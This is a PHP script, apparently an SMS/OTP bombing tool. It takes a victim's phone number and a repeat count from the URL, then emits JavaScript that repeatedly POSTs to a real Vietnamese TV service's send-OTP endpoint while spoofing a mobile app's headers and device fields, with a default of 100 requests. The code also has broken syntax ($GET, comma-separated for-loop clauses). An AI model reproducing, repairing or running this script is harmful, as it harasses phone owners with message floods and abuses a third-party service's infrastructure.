<?php
$phone = $GET["phone"];
$amount = $GET["amount"];
if(isset($GET["phone"])){
    if($amount == ""){
        for($i=0, $i=100, $i++){
            echo"<script>
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const headers = new Headers();
headers.append('Connection', 'close');
headers.append('Content-Type', 'application/x-www-form-urlencoded');
headers.append('User-Agent', 'okhttp/4.0.1');

const body = `ver=0&manufacturer_id=3c94e2b344d907fb&device_name=Google G011A&device_model=G011A&os_sdk=22&fk=first#key&session=&os_version=5.1.1&device_type=2&version_number=10&mobile_login=".$phone."`;

const init = {
  method: 'POST',
  headers,
  body
};

fetch('https://apib2cm.mytvnet.vn/v8/vnptid/send-otp', init)
.then((response) => {
  return response.json(); // or .text() or .blob() ...
})
.then((text) => {
  // text is the response body
})
.catch((e) => {
  // error in e.message
});
</script>
";
echo"Done (".$i.")";
echo"\r                   \r";
            sleep(1);
        }
    }else{
        for($i=0, $i=$amount, $i++){
            echo"<script>
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const headers = new Headers();
headers.append('Connection', 'close');
headers.append('Content-Type', 'application/x-www-form-urlencoded');
headers.append('User-Agent', 'okhttp/4.0.1');

const body = `ver=0&manufacturer_id=3c94e2b344d907fb&device_name=Google G011A&device_model=G011A&os_sdk=22&fk=first#key&session=&os_version=5.1.1&device_type=2&version_number=10&mobile_login=".$phone."`;

const init = {
  method: 'POST',
  headers,
  body
};

fetch('https://apib2cm.mytvnet.vn/v8/vnptid/send-otp', init)
.then((response) => {
  return response.json(); // or .text() or .blob() ...
})
.then((text) => {
  // text is the response body
})
.catch((e) => {
  // error in e.message
});
</script>";
echo"Done (".$i.")";
echo"\r                   \r";
sleep(1);
        }
    }
}else{
    echo"Không tìm thấy số điện thoại(phone error)";
}
?>